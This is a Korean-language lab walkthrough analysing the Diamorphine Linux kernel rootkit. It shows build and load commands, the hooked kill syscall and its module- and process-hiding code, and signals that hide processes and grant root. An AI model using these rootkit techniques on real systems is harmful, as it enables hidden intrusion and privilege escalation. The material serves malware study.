# Diamorphine 실습
Diamorphine 은 LKM 루트킷 중 하나로, 프로세스 은닉, 은폐, 권한 상승 기능을 제공한다.  
시스템콜을 후킹하여 몇가지 커널 기능을 가로채고 작동하는 방식을 살펴본다.  

<br>

**실습환경**  
- **버전** : Kali Linux 2019.4 (커널 5.3.9)
- **목표** : rootkit 동작 방식 분석
<br>

자세한 내용을 보고 싶으면 아래 링크에서 볼 수 있다.  
https://github.com/m0nad/Diamorphine

우선 설치해서 실행을 시켜본 뒤 기능과 원리를 정리해보자.  
<br>

**1. 우선 깃 클론을 해준다.**  

<img src="https://github.com/user-attachments/assets/ed0599cc-afa1-48ec-aa6d-13130ffcea11" width=800>   

<br>

```bash
$ git clone https://github.com/m0nad/Diamorphine.git
$ cd Diamorphine
$ make
```

그리고 해당 디렉토리로 이동한 뒤 make 로 컴파일을 해주면 diamorphine.ko 모듈이 생성된다.   

<br>

**2. 기능 파악**

```c
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_kill(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
#endif
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
```

diamorphine.c 에서 일부 코드를 가져왔다.  

간단하게 설명해보자면,   

- `#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)`
  - 리눅스 커널 4.16.0 이후부터 kill syscall 핸들러가 기존 방법 형태와 달라서 다르게 처리해주는 모습이다.
  - 커널 4.16.0 이전 : `asmlinkage int sys_kill(pid_t pid, int sig)` 
  - 커널 4.16.0 이후 : `asmlinkage long sys_kill(const struct pt_regs *regs)`


- `#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)`
  - 아키텍처 마다 시스템콜 인자 전달 규약이 달라서 레지스터를 맞춰준 것이다.
  - x86_64 는 rdi, rsi 필드로 보내주고,  
  - arm64 는 x0 과 x1 로 보내준다.  

- 이제 세가지 시그널에 따라 세가지 기능을 수행하게 된다.   
```c
enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};
```
- diamorphine.h 에 정의된 시그널 넘버들이다.
- 우선 간단히 한줄로 간단히 소개하고, 이후 직접 사용해보며 코드를 분석해보자.   
  - `SIGINVIS` : PF_INVISIBLE 플래그로 전환시켜 proxfs 목록에서 제외시킨다 (ps가 /proc을 읽을 때 해당 프로세스를 건너뛰어 숨길 수 있음.)
  - `SIGSUPER` : give_root() 함수를 통해 지정된 pid 프로세스에 루트 권한을 부여한다.  
  - `SIGMODINVIS` : module_hide(), module_show() 함수로 모듈리스트에서 숨기고 등장시킨다.
 

<br>

그럼 이제 각 시그널을 직접 입력해보고 분석해보자.  

<br>


### SIGMODINVIS: 모듈 로드 & 언로드

<img width="1127" height="155" alt="image" src="https://github.com/user-attachments/assets/abf3d6fb-8e8b-4c6e-9776-abed941e1ea1" />


<br>

```bash
sudo insmod diamorphine.ko
```

우선 바로 모듈을 로드 해준다.   

그리고 로드를 확인해보면 모듈이 보이지 않으므로 아무런 반응이 없다.   
위에 나왔듯이 모듈을 숨기는 SIGMODINVIS 시그널이 보내져있기 때문에 보이지 않는 것이다.   

<br>

```bash
lsmod | grep diamorphine
```
그리고 바로 lsmod 로 diamorphine 이 작동 중인지 확인해보면 아무것도 찾지 못한다.  


```bash
sudo kill -63 0
```  
하지만 kill로 63 번 시그널(SIGMODINVIS) 을 현재 프로세스인 root(0) 으로 보내고 lsmod 를 다시 해보면, 숨겨놨던 프로세스가 다시 보인다.  

<br>



**코드 분석**

```c
case SIGMODINVIS:
  if (module_hidden) module_show();
  else module_hide();
  break;
```

```c
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}
```

SIGMODINVIS (63번 시그널) 을 받게 되면 `module_hidden` 플래그를 확인하려 `module_show` 혹은 `module_hide` 함수를 호출한다.   
<br>

**module_hide**  
리눅스 커널은 insmod 로 로드된 모든 모듈을 전역 모듈 리스트에 기록한다.   

/proc/modules 파일이 그 리스트를 순회하면서 각 모듈의 이름과 크기를 출력해주는 인터페이스인데,  
module_hide 가 `list_del(&THIS_MODULE->list)` 를 호출하여 내부 모듈 리스트에서 해당 모듈을 지워버린다.  

물론 그냥 지워버리는건 아니고 module_previous 에 자신 바로 이전 노드를 저장하고 지운다.   

이 로직을 보고 든 생각은 이전 노드를 가르킬 때 이전 노드가 사라지거나 포인터 위치에 변화가 생기면, module_previous가 가리키는 주소가 댕글링 포인터가 되고 ..  그럼 UAF 상황이 발생하게 된다.  

커널에 문제가 생길 수 있으므로 리스트 헤더에 넣어 관리하는 더 괜찮아 보인다.   
<br>

**module_show**  
module_hide 에서 저장해둔 module_previous 위치 바로 다음에 자신을 다시 삽입한다.  
module_hidden = 0 으로 숨김처리가 안되어있다는 걸 나타낸다.  

<br>
<img width="1397" height="340" alt="image" src="https://github.com/user-attachments/assets/ac6547be-084f-41be-8dd3-4409bca3bd3a" />

<img width="1392" height="350" alt="image" src="https://github.com/user-attachments/assets/b7a0f403-9c42-4fce-a6d4-42b2a06111b2" />

/proc/modules 를 살펴보면 63번 시그널을 보냈을 때 diamorphine 동작이 숨겨지는 것을 확인할 수 있다.  

<br>

### SIGINVIS: 프로세스 숨기기

<img width="945" height="181" alt="image" src="https://github.com/user-attachments/assets/f44f3d3a-10f9-4805-a706-442a346974bf" />

이 시그널을 사용하기 위해서 임의로 sleep 명령어를 통해 1000초 동안 대기하는 프로세스를 백그라운드로 실행했다.  

```
# sleep 1000 &
[1] 1440
```
```
# jobs -l
[1]+    1440 Running            sleep 1000&
```
jobs 명령어로 확인해보면 1440 PID 를 가진 프로세스가 백그라운드로 작동 중인 것을 확인할 수 있다.  

<br>

<img width="954" height="214" alt="image" src="https://github.com/user-attachments/assets/ce7bfa5d-480c-4aed-9d7d-4ac2c3bfdbbc" />

```
# sudo kill -31 1440
# ps -p 1440
```

SIGINVIS를 작동시키기 위해 31 번 시그널을 1440 PID 에 보내주고 ps 로 실행중인 프로세스를 확인해보면,  
아무것도 뜨지않는다.  

다시 한번 더 31번 시그널을 보낸 뒤 ps 로 확인해보면,  
1440 프로세스가 실행중인 것을 확인할 수 있다.  

이걸로 특정 프로세스를 숨길 수 있는 기능이다.    
<br>

**코드 분석**
```c
case SIGINVIS:
  if ((task = find_task(pid)) == NULL)
    return -ESRCH;
  task->flags ^= PF_INVISIBLE;
  break;
```
```c
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}
```

